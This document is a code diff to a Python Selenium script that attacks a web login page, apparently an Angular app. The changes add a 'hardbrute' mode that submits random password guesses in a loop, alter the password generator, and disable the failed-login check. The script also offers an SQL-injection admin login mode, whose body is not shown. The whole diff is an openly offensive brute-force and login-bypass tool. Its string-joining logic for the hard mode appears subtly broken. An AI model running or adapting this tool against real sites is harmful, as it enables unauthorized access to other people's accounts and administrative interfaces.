@@ -7,11 +7,20 @@ import argparse
 import time
 import random, string
 
-letters = string.ascii_letters + "0123456789"
+letters = string.ascii_lowercase
+num_options = "0123456789"
+all_letters = string.ascii_letters.join(num_options)
 
 def randomword():
-    length = random.randint(2, 16)
-    return ''.join(random.choice(letters) for i in range(length))
+    length = random.randint(3,7)
+    nums = random.randint(0,4)
+    out = ''.join(random.choice(letters) for i in range(length))
+    out = out + ''.join(random.choice(num_options) for i in range(nums))
+    return out
+
+def randomhard():
+    length = random.randint(1, 16)
+    return ''.join(random.choice(all_letters) for i in range (length))
 
 def main():
     parser = argparse.ArgumentParser()
@@ -40,7 +49,9 @@ def main():
     if(method == "sql"):
         logInAdminSql(driver)
     elif(method == "brute"):
-        bruteForcePassword(driver, attempts)
+        bruteForcePassword(driver, attempts, False)
+    elif(method == "hardbrute"):
+        bruteForcePassword(driver, attempts, True)
     elif(method == "dict"):
         print("dictionary attack is not available in your geographic region")
     else:
@@ -50,7 +61,7 @@ def main():
     driver.quit()
     exit()
 
-def bruteForcePassword(driver, attempts):
+def bruteForcePassword(driver, attempts, hardness):
         # Attempt to log in
     print("Strap in, this could take quite a while")
     try:
@@ -74,7 +85,10 @@ def bruteForcePassword(driver, attempts):
     # Open file and test each password
     #with open("genericPasswords.txt") as f:
     for n in range(1, attempts):
-        password = randomword()
+        if(hardness):
+            password = randomhard()
+        else:
+            password = randomword()
         try:
             print(f"Trying password: {password}")
             passwordField = WebDriverWait(driver, 10).until(
@@ -86,12 +100,12 @@ def bruteForcePassword(driver, attempts):
         except Exception as e:
             print(f"Could not enter text: {e}")
          # Check if the login was successful
-        try:
-            invalidDiv = WebDriverWait(driver, 10).until(
-                EC.presence_of_element_located((By.CLASS_NAME, "error.ng-star-inserted"))
-            )
-        except Exception as e:
-            print(f"Could not find invalid text: {e}")
+        #try:
+            #invalidDiv = WebDriverWait(driver, 10).until(
+            #    EC.presence_of_element_located((By.CLASS_NAME, "error.ng-star-inserted"))
+            #)
+        #except Exception as e:
+        #    print(f"Could not find invalid text: {e}")
 
 
 def logInAdminSql(driver):
